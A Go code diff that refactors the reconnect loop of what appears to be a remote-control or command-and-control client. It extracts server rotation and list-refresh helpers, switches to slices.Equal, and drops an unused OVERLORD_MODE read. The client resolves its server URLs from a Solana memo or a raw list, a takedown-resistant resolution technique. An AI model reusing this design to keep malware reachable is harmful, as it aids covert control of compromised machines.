@@ -14,6 +14,7 @@ import (
 	"os"
 	"runtime"
 	"runtime/debug"
+	"slices"
 	"strconv"
 	"strings"
 	"time"
@@ -87,17 +88,9 @@ func runClient(cfg config.Config) {
 			}
 
 			if shouldRefreshServerList(cfg, consecutiveFailures, lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
-				if refreshServerList(&cfg) {
-					lastSolRefresh = time.Now()
-					currentIndex = 0
-					consecutiveFailures = 0
-				}
+				tryRefreshServerList(&cfg, &lastSolRefresh, &currentIndex, &consecutiveFailures)
 			}
-
-			if len(cfg.ServerURLs) > 1 {
-				currentIndex = (currentIndex + 1) % len(cfg.ServerURLs)
-				log.Printf("switching to next server [%d/%d]: %s", currentIndex+1, len(cfg.ServerURLs), cfg.ServerURLs[currentIndex])
-			}
+			rotateToNextServer(&currentIndex, cfg.ServerURLs)
 
 			time.Sleep(backoff)
 			cancel()
@@ -134,17 +127,9 @@ func runClient(cfg config.Config) {
 			lastDisconnect = time.Now()
 
 			if shouldRefreshServerList(cfg, len(cfg.ServerURLs), lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
-				if refreshServerList(&cfg) {
-					lastSolRefresh = time.Now()
-					currentIndex = 0
-					consecutiveFailures = 0
-				}
+				tryRefreshServerList(&cfg, &lastSolRefresh, &currentIndex, &consecutiveFailures)
 			}
-
-			if len(cfg.ServerURLs) > 1 {
-				currentIndex = (currentIndex + 1) % len(cfg.ServerURLs)
-				log.Printf("switching to next server [%d/%d]: %s", currentIndex+1, len(cfg.ServerURLs), cfg.ServerURLs[currentIndex])
-			}
+			rotateToNextServer(&currentIndex, cfg.ServerURLs)
 		}
 
 		sleepFor := backoff
@@ -159,6 +144,21 @@ func runClient(cfg config.Config) {
 			}
 		}
 		time.Sleep(sleepFor)
+	}
+}
+
+func rotateToNextServer(currentIndex *int, urls []string) {
+	if len(urls) > 1 {
+		*currentIndex = (*currentIndex + 1) % len(urls)
+		log.Printf("switching to next server [%d/%d]: %s", *currentIndex+1, len(urls), urls[*currentIndex])
+	}
+}
+
+func tryRefreshServerList(cfg *config.Config, lastSolRefresh *time.Time, currentIndex *int, consecutiveFailures *int) {
+	if refreshServerList(cfg) {
+		*lastSolRefresh = time.Now()
+		*currentIndex = 0
+		*consecutiveFailures = 0
 	}
 }
 
@@ -268,7 +268,7 @@ func refreshServerURLsFromSolana(cfg *config.Config) bool {
 		log.Printf("[config] WARNING: Solana memo returned no valid URLs")
 		return false
 	}
-	if !equalStringSlices(cfg.ServerURLs, urls) {
+	if !slices.Equal(cfg.ServerURLs, urls) {
 		log.Printf("[config] resolved server URLs from Solana memo (%d servers)", len(urls))
 		cfg.ServerURLs = urls
 	}
@@ -287,24 +287,13 @@ func refreshServerURLsFromRaw(cfg *config.Config) bool {
 		return false
 	}
 
-	if !equalStringSlices(cfg.ServerURLs, urls) {
+	if !slices.Equal(cfg.ServerURLs, urls) {
 		log.Printf("[config] refreshed raw server list (%d servers)", len(urls))
 		cfg.ServerURLs = urls
 	}
 	return true
 }
 
-func equalStringSlices(a, b []string) bool {
-	if len(a) != len(b) {
-		return false
-	}
-	for i := range a {
-		if a[i] != b[i] {
-			return false
-		}
-	}
-	return true
-}
 
 func createHTTPTransport(cfg config.Config) *http.Transport {
 	tlsConfig := &tls.Config{
@@ -389,8 +378,6 @@ func classifyDialError(err error) string {
 }
 
 func computeBaseBackoff() time.Duration {
-	mode := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_MODE")))
-	_ = mode
 	return randomReconnectDelay(10*time.Second, 30*time.Second)
 }
 
